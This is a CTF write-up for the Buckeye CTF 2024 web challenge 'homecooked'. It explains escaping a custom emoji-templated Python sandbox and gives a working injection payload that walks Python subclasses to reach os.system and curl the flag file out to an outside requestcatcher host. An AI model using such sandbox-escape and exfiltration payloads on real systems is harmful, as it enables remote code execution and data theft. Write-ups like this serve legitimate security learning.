# web / homecooked

A challenge from Buckeye CTF 2024

### Description

I've been working on my own ASGI-complaint Python web framework. It's still in the early stages, but I think it's coming along nicely. I've set up a demo site for you to try it out. Can you find the flag?

homecooked.challs.pwnoh.io

File: [homecooked.zip](./homecooked.zip)

### Solve

Starting to look through the code (and the actual site), you can see that it lets you run code in its home-made language with emojis. There's a whole grammar in lark file, which was super annoying to parse (curse CS 236 being useful). But the whole site ran on a template similar to flask, so the challenge was basically prompt injection.

I worked on this with LegoClones, since after I learned that it was pretty locked down in what it could run, it was a pyjail and I don't have a ton of experience there. Thankfully, lego knew what was going on. We used the grammar as implemented and the code injection section to print the flag with this string:

```py
🥢hex🥚__class__🥚__bases__🍎0🍏🥚__subclasses__🦀🦞🍎221🍏🦀🦞🥚_module🥚__builtins__🍎'__import__'🍏🦀'os'🦞🥚system🦀'curl http://lego.requestcatcher.com/$(cat /flag.txt)'🦞🥢
```

So kinda neat but also kinda annoying. The resource for solving the challenge was [this Hacktricks site](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)